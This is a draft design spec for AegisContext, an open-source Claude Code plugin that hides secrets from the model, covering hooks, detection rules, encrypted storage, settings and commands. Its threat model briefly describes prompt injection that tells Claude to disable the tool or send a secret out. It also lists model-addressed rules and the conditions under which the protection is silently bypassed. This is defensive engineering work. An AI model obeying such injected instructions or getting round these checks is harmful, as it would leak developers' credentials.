# Spec: AegisContext

An open-source tool that stops secrets from reaching the model when developers use Claude Code.

- **Status:** draft.
- **License:** Apache-2.0.
- **Last updated:** 3 November 2026 (the main goal in section 2, section 22 updated to the measured results; step 8: the optional put-back setting, D-096; step 7: `/redact remove`, the backup lock's skill text limit, signed tags, D-090 to D-094).
- **Maintainer:** Mrinanka Dhar

**How to read this spec.** Requirements a build must meet have an ID (`R-01`) and the word **must**. Tests in `plan.md` point to these IDs. **Should** means strongly recommended but not release-blocking. Facts about Claude Code were checked on a real machine in Step 0; the evidence is in `docs/engineering/findings-step0.md`, and a check number (`0.4`) points to its row.

**About the name.** AegisContext is the final name (decided in step 6, D-081 in the decision log; it replaces NoCreds, which was the first choice the same day). The plugin is `aegiscontext`, the settings key `aegisContext`, the environment prefix `AEGISCONTEXT_`, the data folder and password-store service `aegiscontext`, and the repo `Mrinanka/aegiscontext`. The name has no "Claude" or "Anthropic" in it (trademarks; "for Claude Code" in the description is fine). When chosen it was free on npm and no GitHub repo was named `aegiscontext`, but "Aegis" is common in security: other tools use it for Claude Code secret detection, an LLM secrets firewall and a Kubernetes secrets store. The README does not name or describe other tools. No trademark register has been searched; do that before v0.1.0.

---

## 1. What it does, in one paragraph

When a developer types a message, or Claude reads a file or command output, the tool looks for passwords, API keys and tokens. It swaps each one for a placeholder before the model sees it. Claude can still work normally: it knows a secret is there, but never sees the real value. By default the tool never writes real secrets back into files, and developers fill in real values themselves. An optional setting, off by default, puts a value back into a file that already holds it (section 10).

## 2. Goals and non-goals

**Goals**

- **The main goal: find every secret that has a known shape or a label, let people register the ones that have neither, and be easy to use, with every feature they need.**
- Very low chance of a secret reaching the model (measured; see section 20).
- Fast enough that nobody notices it running.
- Works with no setup, and is easy to change for people who want to.
- **Anyone can install it and prove to themselves that it works,** without help from the maintainers and without sending anything to the internet.
- Works for one developer on their own laptop (**Personal mode**) and for an organization that rolls it out to many machines (**Managed mode**).
- Every strict behaviour has a way out for false alarms.
- Simple: only features that clearly reduce risk.

**Not goals for v1**

- Other AI tools (Copilot, Cursor and so on). v1 is Claude Code only.
- Hiding personal data by default. Emails and phone numbers are checked only when the `personal_data` setting is on (D-037).
- Reading inside images and documents. v1 can only pass them or drop them (section 6).
- Putting secrets back into files by default, or into a file that doesn't already hold the value. Only the optional, off-by-default setting in section 10 does it, and only for Write and Edit (D-096).
- Being a compliance certification. The tool is built to stop accidental leaks and the prompt-injection cases in section 3; it is not a guarantee that no secret is ever sent.

## 3. Threat model

| | In scope | Out of scope |
|---|---|---|
| **Accidental leaks** | A developer pastes a key, Claude reads `.env`, a log prints a token, an error shows a connection string | — |
| **Prompt injection** | A web page, file or tool result tells Claude to turn the tool off, edit its settings, or send a known secret somewhere | — |
| **Deliberate people** | — | A person who splits up, scrambles or retypes a secret on purpose |
| **Other software on the machine** | — | Malware, other plugins in Personal mode (section 5.3), or someone with admin rights |
| **Claude Code's own disk records** | Documented (section 22) | Changing what Claude Code stores |

## 4. Where it works

| | v1 |
|---|---|
| **Surfaces** | The Claude Code terminal, the VS Code extension and the Code tab of the desktop app. Scripted runs (`claude -p`) too. |
| **Not covered** | claude.ai chat. Claude Code on the web and Agent SDK hosts, unless listed in the tested-versions list. Plugins are not available in the desktop app's WSL sessions (checked in the app, step 6). |
| **Systems** | macOS, Windows and Linux, all first-class. That includes WSL and devcontainers. CI runs on all three. |
| **Claude Code versions** | A **tested versions** list is published with each release (section 20). v1 supports the Claude Code version pinned for testing (and newer, with the R-01 warning). Hunting for the lowest working version is parked (section 23, D-019). Earlier figures (2.1.287 for mods, 2.1.295 for "block if this check fails") were never checked, and won't be in v1 (section 23). Step 0 was checked against 2.1.316. The VS Code extension runs its own copy of Claude Code, which can be a different version from the CLI (2.1.314 when the CLI was 2.1.316); the tested-versions list names both. |

- **R-01** At session start, the tool **must** show a one-line warning when the Claude Code version is not on its tested list, and keep working.

## 5. How it is built: a main lock and a backup lock

### 5.1 Main lock (the mod)

A Claude Code plugin with a hooks module, written in TypeScript. It uses these hook points:

| Hook | Used for |
|---|---|
| `session.append` | **All hiding.** Every row the conversation keeps passes through it before it is stored or sent: typed prompts, slash-command output, tool results (including errors), attachments, injected context (including settings hooks' context), queued messages, compaction summaries, and the same rows inside subagents (check 0.1). |
| `prompt.submit` | Hides secrets in the prompt text before it is recorded anywhere, including the message-queue record. |
| `prompt.context` | The blocks a conversation's first message carries, including the project's `CLAUDE.md` text, which is rendered per request and never passes `session.append` (D-042). |
| `prompt.attachment` | Text the engine injects per request. A rewrite at `session.append` can be ignored for these, so this is the second layer (D-042). |
| `prompt.mention` | `@` files: points the read at a redacted temporary copy, or refuses it (section 6). Works for a plugin in the user tier (check 0.2). The model sees the copy's path, so the copy's name **must not** reveal that it is a copy, and the model's own Read of the real file is hidden at `session.append`. |
| `tool.call` | Outbound check (section 11), self-protection (section 17), put-back (section 10, when on) and the overwrite guard (section 10). A Write or Edit input can be rewritten here, and the rewritten input is not what later requests carry: the `tool_use` block stays as Claude wrote it (spike S7, D-096). |
| `prompt.compose` | Adds the short placeholder note to Claude's instructions, and one more line only while put-back is on. The note **must** be the same for the whole thread, because changing it later breaks the prompt cache; turning put-back on mid-thread takes effect at once for restoring, and the extra line waits for a new session. |
| Slash commands | `/redact` and its subcommands (section 15). |

- **R-02** Every row the main lock rewrites **must** be rewritten before it is stored. A row already sent cannot be changed (section 6.2).
- **R-03** Hooks that can refuse something (`tool.call`, `prompt.submit`, `prompt.mention`) **must** carry a `.catch` handler, so a failure follows the `on_check_failure` setting instead of the engine's default of letting it through (section 12).

### 5.2 Backup lock (settings hooks)

Settings-file hooks (`UserPromptSubmit`, `PreToolUse`, `PostToolUse`) that run the same checker with Node. They only act when the main lock isn't alive, for example after a crash, or when an admin policy blocks plugin hooks. Node is required (D-069). The build is `plugin/backup/`, compiled from `src/backup`, `src/core` and `src/checker` by `npm run plugin:build`; `/redact backup` copies it to `<config>/aegiscontext/backup/` and prints the settings to paste (D-068, section 15).

**Strict (D-070).** When it acts, the backup lock is strict:
- **Before a tool runs,** every check applies to the call: saved values, shapes and labels (not only saved values, as the main lock's outbound check does), then self-protection and the overwrite guard (sections 10, 11, 17). A call that holds a secret is denied with a reason that names a kind and a tag, never a value.
- **A prompt** that holds a secret is blocked whole, because a hook can't hide part of one.
- **Tool output** is cleaned and keeps its shape; a note says how many values were hidden.
- **Settings** come from the same sources as the main lock's, read from files (D-076).
- **A check that can't finish** follows `on_check_failure` (section 12): `hold` blocks, denies or withholds; `allow` passes with a warning and a log line. Observe mode holds nothing.

**Safe mode (check 0.8).** `--safe-mode` turns off user settings hooks along with plugins. So in Personal mode, safe mode turns off **both** locks. Only backup-lock hooks installed through managed settings still run in safe mode.

| Can do | Outside its scope (settings hooks can't reach it) |
|---|---|
| Block a prompt that contains a secret | Hide part of a prompt and let the rest through |
| Outbound check before a tool runs | Cover `@` files, attachments or compaction summaries |
| Change a tool's input before it runs (check 0.9) | |
| Clean a tool's output after it runs, built-in tools included, by returning the tool's own result with secrets replaced. The result **must** keep the tool's shape; any other value is ignored (check 0.9). Proven for Read, Bash (a 200 KB output too), connected tools and a subagent's Read (spike S3). | Clean the error of a **failed command**: the one hook that sees it can only stop the request, and the raw error is sent on the next prompt (spike S1, D-072) |

**Doors the backup lock covers** (the leak kit runs each one with the plugin not loaded, and no fake may be seen): a typed prompt, a pasted prompt, a file Claude reads, command output (large too), a connected tool's result, a subagent's file read.
**Outside its scope, measured** (the main lock covers each; the kit runs each with the backup lock alone, expecting every fake to be seen, so the list is proven, not claimed): `@` files, a failed command's error, a compaction summary, a resumed session's history, project `CLAUDE.md` text, settings-hook context and skill text.

- **R-04** The main lock **must** write an "I'm running" marker per session, with a `beat` it refreshes while it is used (at most every 30 seconds). The backup lock **must** check the marker first and do nothing when it says `running: true` with a fresh beat (not older than 5 minutes), and be strict for that session when the marker is missing, unreadable, not running, or stale. A crash leaves `running: true` behind, so age decides; a beat from the future (beyond 5 seconds) counts as stale. A mod can't delete a file, so the marker ends the session as `running: false`, which counts as missing (D-047, D-077). The 30 seconds and 5 minutes are first guesses with no measurement behind them.

### 5.3 Personal mode vs Managed mode

| | Personal mode | Managed mode |
|---|---|---|
| Who installs | The developer, from the plugin marketplace | An admin: a folder on each machine that holds the marketplace, plus managed settings (`docs/snippets/managed-plugin.json`) |
| Plugin tier | `user`: other plugins installed in higher tiers run first and could skip it | `prepend`: the plugin is enabled by managed `enabledPlugins` and named in managed `prependPlugins`, so it runs first and no user plugin can skip it. A plugin fetched from GitHub or a git URL counts as a user's, so it cannot be seated there. |
| Claude Code's built-in guard (`sec-default@builtin`) | **Passes some events past a user-tier plugin** on a machine with managed settings or a managed MCP server file, or with a Team or Enterprise login (any one is enough): `prompt.context` (instruction files), `prompt.attachment`, `prompt.compose`, `session.compact`, and the `attachment`, `hook-context` and `compaction` rows of `session.append`, with the Skill tool's `tool-message` rows. The plugin cannot hide what passes it by; it says so once per session and in `/redact doctor`, and under `on_check_failure: hold` it refuses the request (section 22). | Works: listed in `prependPlugins` after the plugin, it sits where the plugin expects |
| Messages, files read, command output | Hidden | Hidden |
| `@` files | Hidden through `prompt.mention` (check 0.2) | Hidden |
| Compaction summaries | Hidden through `session.append` (check 0.1), except where the built-in guard passes the `compaction` row over (see above) | Hidden |
| Can the user switch it off? | Yes | No. Settings can be locked |
| If the organization sets `allowManagedHooksOnly` | **Does nothing.** User-tier plugins load no hooks and user settings hooks don't run (check 0.7). A plain command (no hooks) still loads and says so. | Works |
| If a project's `.claude/settings.json` (or `settings.local.json`) sets `disableAllHooks` | **Does nothing**, silently. Both locks are off (check 0.14). | Works: a project can't turn off managed hooks |
| `--safe-mode`, `--bare`, `CLAUDE_CODE_SIMPLE=1` | **Does nothing** (checks 0.8, 0.14) | Safe mode: managed backup-lock hooks still run |

The backup lock is installed in Personal mode by `/redact backup` and the Personal snippet (`docs/snippets/personal.json`), which leaves `onFailure` out; in Managed mode an administrator uses the Managed snippet (`docs/snippets/managed.json`), which sets `onFailure: "block"` on all three hooks and carries a `--policy` placeholder (D-069, D-076). `/redact doctor` warns when the hooks lack `onFailure: "block"`.

- **R-05** When the tool can't run its hooks (for example under `allowManagedHooksOnly`, `disableAllHooks` or `--safe-mode` in Personal mode), it **must** say so plainly where possible. Users must never believe they are protected when they aren't. When hooks are blocked, none of the tool's code runs (checks 0.7, 0.14), so a plain command with no hooks, `/aegiscontext:doctor`, **must** say the hooks are not running. A plugin's plain command always carries the plugin's name; `/redact` only exists while the hooks run (D-059).
- **R-05a** When Claude Code's built-in guard routes events past the plugin, the tool **must** say so once per session where it can (a main `turn.step` that arrives with no `prompt.compose` seen), name what is not being checked and the fix, write it to the log, and show the same in `/redact doctor` with the plugin's tier. Under `on_check_failure: hold` it **must** refuse every main request instead of sending it. It never claims to be protecting what it cannot see (D-082, D-087).

## 6. What gets checked

| Content | v1 |
|---|---|
| Messages the user types or pastes | Checked |
| Files Claude reads | Checked |
| Command output, including errors from failed commands | Checked |
| Files attached with `@` | Checked (section 5.3) |
| Compaction summaries | Checked |
| Results from connected tools (MCP) | Checked (text parts) |
| Subagents | Checked (same hooks, the row's `agentId` is set) |
| Resumed sessions (`/resume`, `--resume`) | See 6.1 |
| Images and documents (PDFs) | Setting `media`: `pass` (default, with a one-line notice) or `drop` (removed, with a note to Claude saying so) |

### 6.1 Resumed sessions

Rows loaded by `/resume` are **not** passed through `session.append`. Claude Code sends them as they were stored. A session from before the tool was installed, or from before a secret was registered, can therefore contain raw secrets.

- **R-06** When a session is resumed, the tool **must** scan the loaded history. If it finds a secret, it **must** block the next prompt and tell the user: "This session's history contains N secrets that the model would see again. Start a new session (or `/redact allow` to continue anyway)." How (check 0.3, D-056): read the history at `prompt.submit` (after an in-session `/resume`, `session.start` has run before the history loads) and drop the prompt, which shows the reason. While the block stands, `/compact` is skipped, because it would send the history too, and any turn with no prompt is held at `turn.step`.

### 6.2 Secrets registered mid-session

Claude Code never changes what a thread has already sent. `/redact add` therefore protects only from that point on.

- **R-07** When a secret is registered, the tool **must** check this session's stored history and, if the value appeared earlier, warn: "This value was already sent to the model N times this session. Consider rotating it."

## 7. How it finds secrets

Six checks, run in one pass over the text:

| # | Check | Catches | Example |
|---|---|---|---|
| 1 | Known key formats | Keys with a fixed shape, from the Gitleaks rule set (pinned version; see section 21) | AWS, Azure, GitHub, GitLab, Slack, Stripe, JFrog, Databricks keys |
| 2 | Password labels | A value after a clear label, short or simple, quoted or not | `password=Autumn2026`, `pw: hunter2`, `DB_PASSWORD="..."`, `Password=` inside a connection string |
| 3 | Your own secrets | Exact values the user registered | Any format, including internal company token formats |
| 4 | Once caught, always caught | A secret seen earlier in the session, wherever it shows up again | The same key later in a log without its label |
| 5 | Disguised copies | Secrets in encoded form | base64, base64url, URL-encoded, hex, escaped JSON |
| 6 | Custom rules | Patterns added in settings, no code change | An internal format such as `acme_[a-z0-9]{32}` |

### 7.1 Password-label grammar

A label match needs all of these:

1. **A label.** Case-insensitive, matched as a whole word or as the end part of a name (`DB_PASSWORD`, `smtpPass`, `client-secret`). The label may be a quoted key, written `"password":` or, inside escaped JSON, `\"password\":` (D-031). `password`, `passwd`, `secret`, `token` and `apikey` also match with no boundary before them (`PGPASSWORD`, `authtoken`). Shorter labels don't, because they end ordinary words (`bypass`, `monkey`) (D-033).
2. **A separator** right after it, with optional spaces: `=`, `:`, `=>`, `:=`, or a connection-string `;Key=`. A label without a separator never matches. So Python's `pass` statement and the word "password" in a sentence are left alone.
3. **A value.** Quoted (`'...'`, `"..."`, backticks) or unquoted, up to the next space, `;`, `,`, `&`, closing bracket or end of line.

Two more shapes follow the same value rules (D-031): the password in a URL (`scheme://user:password@host`, hidden when 6 characters or longer and not harmless), and a private key whose end line is missing (hidden from the header to the last base64 line).

Headers and command lines (D-034), where the scheme word and the flag stay visible and only the value is hidden:

- An `Authorization:` header: the value after `Bearer`, `Basic` or `Token` when it is 8 characters or longer, or a bare value that looks random.
- `Bearer value` with no header word, when the value looks random, since prose says "bearer token".
- A long flag ending in a strong label, with a space as the separator: `--password value`, `--api-key value`. A value of plain lowercase letters is prose ("the --password option") and is left alone.
- The attached password of `mysql`, `mariadb` and `sshpass`: `-pvalue`, and `sshpass -p value`. Only these commands, because `-p` is a port or a parent folder nearly everywhere else.

| Label strength | Labels | Hides the value when |
|---|---|---|
| **Strong** | `password`, `passwd`, `pwd`, `pw`, `pass`, `secret`, `client_secret`, `token`, `api_key`, `apikey`, `private_key`, `conn_str`, `connection_string` | It is 6 characters or longer and not a harmless value (7.2) |
| **Weak** | `key`, `auth`, `credential`, `access` | It is also random-looking (mixed character classes and long enough; tuned on the test sets) |

### 7.2 Harmless values (left alone)

- **Placeholders:** `your-password-here` (`your-` or `your_` followed by letters only), `<password>`, `********`, `xxxxxx`, `changeme`, `example`, `dummy`, `test`, `null`, `none`, empty values.
- **Variable references:** `${VAR}`, `$VAR`, `%VAR%`, `{{ var }}`, `${{ secrets.X }}`, `process.env.X`, `os.environ["X"]`, `os.getenv(...)`, `System.getenv(...)`, `ENV["X"]`.
- **Code, not values:**
  - Type names: `string`, `str`, `String`, `number`, `int`, `bool`, `boolean`, `bytes`, `Optional[...]`, `SecretStr`.
  - Closed function calls and lookups: `getToken()`, `hash(salt, value)`, `ENV["X"]`. An unclosed bracket is a value (D-035).
  - Dotted values that end in their own label: `config.password`, `self.secret`, `args.token`. Other dotted values and generics count as code only in a source file, since `DB_PASSWORD=Harbor.Meadow` in a `.env` file is a password (D-035).
  - Unquoted single identifiers in source files, meaning a known source extension (`.ts`, `.py`, `.java`, and so on; not `.sh` or `.env`). A **quoted** value is never treated as code.
  - A value equal to its own label (`password = password`), in any file.
  - **A type alias line** (D-075): on a line that starts `type Name<...> =`, with `export` and `declare` allowed in front, an unquoted value is code in any file, since the file name isn't always known (all Bash output has none). A quoted value is still a value.
- **Prose after a colon** (D-075): after `label:` and a space, an unquoted value of six or more lowercase letters with a space and a letter right behind it reads as a sentence (`token: signature mismatch`) and is left alone. A colon only, not `=`; a capital, a digit, a quote, a comment or the end of the line makes it a value again. The cost: `password: summerrain admin` doesn't hide `summerrain`.
- Documented example keys (for example AWS's documented example access key, the one ending in `EXAMPLE`) and database URLs without a password.

- **R-08** Each harmless rule **must** have a test showing it is left alone, and a matching test showing that a real-looking value in the same spot is hidden.

### 7.3 Unknown random secrets (parked)

Not in v1. Parked in section 23 (D-019).

## 8. Registering your own secrets

- **`/redact add`:** paste a secret once. It is matched from then on (and see 6.2).
- **`/redact remove`:** a picker of the saved values, by label, date and length, never the value. Nothing is ticked at the start, and there is no "remove all". A removed value stops being hidden at once, unless its shape matches a rule (D-091).
- **`/redact learn`:** a one-time picker that lists values from `.env*` files in the project. Nothing is learned unless the user ticks it. Values that look like real secrets start ticked.

### 8.1 How they're stored

An earlier design stored only keyed fingerprints. That conflicts with two other goals: the same cost for 10 or 10,000 secrets, and finding secrets inside base64 without decoding. Checking a keyed fingerprint at every position, for every secret length, is too slow on large outputs. So the secrets are stored **encrypted**:

| Part | Design |
|---|---|
| At rest | The list of secrets (each with a label and the date added) is locked by the OS password store itself: Windows DPAPI (current user, through PowerShell, with the blob in a file), macOS Keychain (`security`), Linux Secret Service (`secret-tool`). The plugin can't encrypt on its own: its runtime has no AES (check 0.4). |
| Pieces | Every list is split into items, a small list being one, so there is one code path (D-036). Sizes come from measurements (D-045): macOS 2,048 bytes × 50, Linux 4,096 bytes × 64, Windows one item of 256 KiB. That is roughly 750 to 1,900 secrets of ordinary size. `/redact learn` must say so when it reaches the cap. |
| Saving | All or nothing: pieces first, each read back, then a small index holding a count and a checksum, itself kept in the store. A failed save leaves the old list working. |
| Reading | Proves the list is whole. A missing or damaged piece gives a visible warning and no list, never a partial one. |
| How the plugin reaches it | `$.process.run`, values on stdin only, never on a command line. A read takes about 18 ms per item on macOS, 11 ms on Linux and 0.2 to 0.5 s on Windows, which doesn't count toward a hook's time limit (checks 0.4, 0.6, D-045). A session with no list starts no process on Windows. |
| No password store (headless Linux, some containers) | The tool keeps working without saved secrets (session catches still work) and `/redact doctor` warns. A plaintext key file is not used. |
| In use | Decrypted into memory when the session starts, never written to disk in plain form |
| Session catches (check 4) | Memory only, for that session, in the host's `$.state` so a restarted worker keeps them (D-044). At most 5,000 values and 100,000 characters. A value over 8,192 characters is hidden where it was found, but not remembered (D-052). |

**Trade-off on record:** someone running as the same user can decrypt the file, just as they can read `.env`. This protects against copying the file elsewhere, not against malware already running as the user.

- **R-09** The tool **must** never write a registered or caught secret to disk unencrypted. That includes logs, reports, temp files and the marker. One exception, only while put-back is on (section 10): the tool may hand Claude Code's own Write or Edit a value to save into a file that already holds that value. The tool itself writes nothing new.
- **R-10** Registered secrets **must** be locked by the OS password store, reached through `$.process` (D-023). The plugin runtime has secure random numbers but no AES (check 0.4).

## 9. What Claude sees

A placeholder in place of each secret, for example:

```
[REDACTED:AWS_ACCESS_TOKEN ...7QXZ #k7q2m5x4p3abc]
```

- **Label:** what kind of secret it was.
- **Last 4 characters:** only for secrets of 12 or more characters, and never for password-label values (check 2). Setting `hints: off` removes them.
- **Random tag:** 13 base32 characters, which is 65 random bits from a secure source. The same secret gets the same tag within a session, including in subagents. The rare exception is a restart of the hidden checks mid-session: a value that could not be saved for it, because it is over 8,192 characters (D-052) or didn't fit in the saved list (D-053), gets a new tag. Nothing is revealed. Two different secrets never share a tag. The backup lock is a new process for each hook call and keeps nothing between calls, so it makes its own tags: the same value gets a different tag in each of its answers, and none of them matches the main lock's. A stable tag would need a key on disk, and a keyed hash of a short password there would break the rule that no hash of a secret is stored (`src/core/store.ts`, R-09). The overwrite guard still works through its same-kind fallback (section 10).

The placeholder note added to Claude's instructions says:
- These are hidden values.
- Don't ask for them or guess them.
- Don't use Edit on a line that contains a placeholder.
- Ask the user to fill values in.
- Only while put-back is on: a placeholder Claude writes into a file that already holds the value is swapped for the real value on save, so Claude may rewrite or Edit such a file.

## 10. Putting secrets back (optional), and the overwrite guard

**By default the tool never writes real secrets into files.** If Claude writes a placeholder into a file, it stays there as text.

- A one-line notice appears, for example: `Claude wrote a placeholder into config.yaml, line 5. Fill in the real value.`
- `/redact` lists every file that got a placeholder this session.

**Overwrite guard.** Claude only saw the redacted file. If it rewrites the whole file, the real secrets would be replaced by placeholders and lost.

- **R-11** Before a Write or Edit runs, the tool **must** check the file on disk. If a real secret in it would be replaced by its own placeholder, the tool **must** block the change and tell Claude to edit only the lines it needs, leaving placeholder lines alone. The user can let it through once with `/redact allow`. While put-back is on, the guard still runs on a Write or Edit but reports instead of blocking (see "A value that can't be restored" below). A NotebookEdit is never restored, so its guard still blocks.
- An Edit whose `old_string` contains a placeholder fails on its own (the text isn't in the file). That is safe and is left alone, unless put-back is on and restores it.

**Put-back (D-096).** An optional setting, `put_back`, off by default, in the main lock only (the backup lock keeps refusing these writes). It exists so Claude can reorganize a config it has only seen redacted. It is risky, and the docs recommend keeping it off.

- **What it does.** On a Write or Edit, the tool reads the file already on disk, as a Read would, and works out the exact text each placeholder hid there. It swaps a placeholder in the input for that text before the tool runs. The model never sees the real value: the rewritten input is not what later requests carry (spike S7).
- **Restored only when** all of these hold: the rule's action is `hide`; the placeholder's tag maps to one source text in that file; the value can be kept hidden afterwards; and the copy limit allows it. Otherwise the placeholder stays as text. A new file, or a value the file doesn't hold, gets nothing restored.
- **Copy limit.** A saved file never holds more copies of a value than the file on disk did. With `replace_all`, each match counts once.
- **A value that can't be restored.** The save goes through and the placeholder stays, even if a real secret in the file is erased by it. This is the one exception to R-11, only while put-back is on. A message and the log say how many real values were replaced; git, or Claude Code's file backups, are the way back.
- **A failed Edit.** If the restored `old_string` isn't in the file, or matches more than once without `replace_all`, the input stays as Claude wrote it, so the error can't echo a real value. The file is compared as Claude Code's Edit reads it: a CRLF file as LF (measured on 2.1.316, which keeps the file's endings when it saves). So a restored value goes in with LF line breaks, and an `old_string` holding CRLF is left as written, because Claude Code would not match it (D-098).
- **Write and Edit only.** Bash can't restore, and NotebookEdit is left alone.
- **Time.** Restoring and the guard share one 3,000 ms limit. Running out is a failed check (section 12).
- **Observe mode** restores nothing.

**Who decides.** The first match wins:

| Order | Condition | Result |
|---|---|---|
| 1 | `mode: observe` | Off |
| 2 | Managed settings say `off` (binds with no `locked`) | Off |
| 3 | A project setting says `off` | Off |
| 4 | The developer's choice file can't be read | Off |
| 5 | The developer ran `/redact put-back on` or `off --here` for this folder | That choice |
| 6 | The developer ran `/redact put-back on` or `off` for all projects | That choice |
| 7 | A project setting says `on` and a surface can show the notice | On, with the notice |
| 8 | Nothing says anything | Off (the default) |

- A managed `on` does nothing: an organization can forbid put-back, not switch it on for people. A `put_back` in User settings is ignored with a notice; the developer's choice is made with the command. `locked: ['put_back']` means off.
- A project's `on` is the one exception to "stricter only" (section 14), because it only counts when the developer has made no choice of their own. It shows a notice naming the repo, even with `notices: off`. Under `claude -p`, and on a surface that can't show the notice, it is ignored.
- The developer's choice is kept in `put-back.json` in the tool's own data folder, never in the repo. It holds paths and `on` or `off`, no value. A broken or oversized file reads as off. A save over a broken file says the earlier choices in it are gone. The oldest folders are dropped so the file stays under 64 KB.
- "This folder" is the session's project root, the folder its project settings come from. A shell `cd` does not move it (D-098).
- A decision that can't be made (an error reading the facts) is off, and the overwrite guard still runs.
- **R-18** Put-back **must** be off unless the table says on. Claude **must not** be able to turn it on or off, or to write the choice file. Anything restored **must** be logged by tag and count only (R-17), never by value.

## 11. Outbound check: commands and web requests

Before Claude runs a command, web request or connected tool, the tool checks whether it contains a known secret (check 3 or 4). This can only happen if a secret slipped past the hiding step, so it's a last safety net.

**Default: block it,** and tell the user why.

| Way out | What it does |
|---|---|
| `/redact allow <tag>` | Marks that value as harmless for this session. Add `--always` to remember it. |
| Setting `outbound: ask` | Asks the user each time: allow or deny |
| Setting `outbound: warn` | Lets it run, shows a warning, writes to the log |
| Setting `outbound: off` | Turns the outbound check off |

Admins can lock this setting.

## 12. When a check fails or takes too long

Claude Code gives each hook **10 seconds of its own time**: time spent waiting on Claude Code (`next`, `$` calls such as running a program) doesn't count. Code that keeps the CPU busy is stopped sooner: at about 6 seconds its worker is ended and restarted (check 0.6). A hook that throws, returns the wrong shape or runs out of time is skipped, and by default the content goes through. A `.catch` handler gets **1 more second** to answer instead.

| Setting `on_check_failure` | Behaviour |
|---|---|
| `allow` (default) | The content goes through with a visible warning and a log entry |
| `hold` | The `.catch` handler withholds the content. Claude gets a short note saying it was withheld. |

- Admins can lock this setting. **Managed-mode docs recommend `hold`.**
- When the built-in guard passes the plugin over, what it would have checked can't be withheld, so `hold` refuses the whole request (R-05a, D-087).
- **R-12** Every failure **must** produce a log entry and a visible warning, whichever setting is used. When the same failure repeats, the screen shows the first 3 and then every 50th, with a count, so a slow file doesn't bury it; the log records each one (D-048).

*Trade-off on record:* with `allow`, a crash or slowdown means that piece of content reaches the model unchecked. The warning makes sure the user knows when it happens.

## 13. Modes: enforce and observe

| `mode` | What happens |
|---|---|
| `enforce` (default) | Everything in this spec |
| `observe` | Nothing is hidden or blocked. Every detection is logged as "would have hidden". A permanent banner says `aegiscontext: OBSERVE MODE, secrets are NOT being hidden`. Self-protection (section 17) stays on: it is no detection, and a trial must not be able to switch the tool off (D-058). |

Observe mode is for organizations measuring false alarms before rollout.

- **R-13** Only Managed or User settings can turn on observe mode, never Project settings. While it is on, the banner **must** be shown in every session.

## 14. Settings

The tool works with no settings at all. Settings live under a `aegisContext` key in Claude Code's own settings files, read through `$.settings.read` (D-041). Three levels apply:

| Level | Where | Who | Rule |
|---|---|---|---|
| Managed | The organization's managed settings (source `policy`) | Admin | The starting point. Can lock any setting with `locked`, a list of setting names (D-049). |
| User | `settings.json` in the user's Claude folder (source `user`) | Developer | Can change anything not locked |
| Project | The project's `.claude/settings.json` and `settings.local.json`, and `--settings` (sources `project`, `local`, `flag`) | Team | **Can only make things stricter.** A downloaded project can't weaken protection. A broken project source is left out on its own. |

"Stricter only" means a project **cannot**:
- add `allow` entries
- turn rules off
- set `mode: observe`
- loosen `outbound`, `on_check_failure` or `media`
- shorten `secret_files`

A project **can** add custom rules and `secret_files` patterns, and choose stricter values. One exception: a project can set `put_back` to `on`, which is less strict, but only when the developer has made no choice of their own, and with a notice (section 10, D-096).

| Setting | Default | Options |
|---|---|---|
| `mode` | `enforce` | `enforce`, `observe` |
| `personal_data` | `off` | `on`, `off` |
| `outbound` | `block` | `block`, `ask`, `warn`, `off` |
| `on_check_failure` | `allow` (with warning) | `allow`, `hold` |
| `media` | `pass` (with notice) | `pass`, `drop` |
| `put_back` | `off` | `on`, `off`. Counts only from managed (`off`) and project, local or flag settings (`on`, `off`); the developer's own choice is made with `/redact put-back` (section 10, D-096) |
| `hints` (last 4 characters) | `on` | `on`, `off` |
| `notices` | `on` | `on`, `off` |
| `rules.off` | none | Rule ids to switch off |
| `rules.custom` | none | Extra patterns, each with a label and a keyword |
| `rules.actions` | `hide` for all | Per rule. `hide`: a placeholder. `warn`: the value stays visible, with a warning and a log entry. `block`: a prompt is dropped with the reason; any other row keeps its place, with its text replaced by a short "withheld" note, because a row can't be refused (D-040). |
| `allow` | none | Values or patterns that are harmless |
| `secret_files` | `.env*` | File patterns treated as secret |
| `log.days` | `30` | Number of days |

- **R-14** The settings file **must** be validated. A broken file shows a clear error, and the tool keeps running on the last good settings (or the defaults).
- **R-15** Custom patterns **must** pass the same "can't get stuck" check as built-in ones (section 18) before use, with a stricter limit because nobody reviewed them and they can start anywhere (D-032). A pattern that fails is rejected with a clear error.

## 15. Commands

| Command | What it does |
|---|---|
| `/redact` | Status of the main and backup locks, the mode, what was hidden this session (type, where, hint), files that got placeholders |
| `/redact add [--label name]` | Register a secret, pasted into a box. Never on the command line, and not in `claude -p` (D-057) |
| `/redact learn` | Pick secrets from `.env*` files |
| `/redact remove` | Pick saved values to remove. Takes no value on the command line, and not in `claude -p`. Shows the newest 200 and says so when there are more (D-091) |
| `/redact put-back [on\|off] [--here]` | With no argument: whether put-back is on, and why (which row of the section 10 table). With `on` or `off`: the developer's choice for all projects, or `--here` for this folder only. Takes no value; anything else on the line is refused and not echoed (D-096) |
| `/redact allow <tag>` | Mark a hidden value as harmless (`--always` to remember, in the OS password store). With no tag: lift a resume block, or let the last guarded change through once (D-060) |
| `/redact backup [managed]` | Copies the backup lock to `<config>/aegiscontext/backup/` and prints the settings to add (Personal, or `managed` for the Managed snippet), and whether Node was found. A later session refreshes an existing copy when it is out of date and never makes one unasked (D-068). |
| `/redact self-check` | Runs built-in test cases and shows pass or fail. `--report` writes a shareable report file (no secrets) for a security team or a bug report. |
| `/redact doctor` (also `/aegiscontext:doctor`) | Checks the environment: Claude Code version (tested or not), Personal or Managed mode, plugin tier, whether hooks are allowed to run, password store available, backup lock installed (hooks found in user or managed settings, copy current or old, `onFailure`), Node found, marker present and when it last beat, settings valid. Says what to fix. |

- **R-16** Claude **must not** be able to run these commands. Only the user can.

## 16. Log

- **Where:** a local file on the user's machine.
- **What it records:** time, which check fired, where (prompt, file name, tool), action taken, mode, and the random tag.
- **R-17** The log **must never** contain a secret. Command text and file paths are logged in their redacted form.
- **How long:** 30 days by default (`log.days`). A mod can't delete a file, so an older log is emptied and only its name stays (D-047).

## 17. The tool protecting itself

- **No network.** It never contacts the internet. No telemetry.
- **No runtime libraries.** All code that runs is in the repo and reviewable. Build-time dev dependencies are pinned with a lockfile.
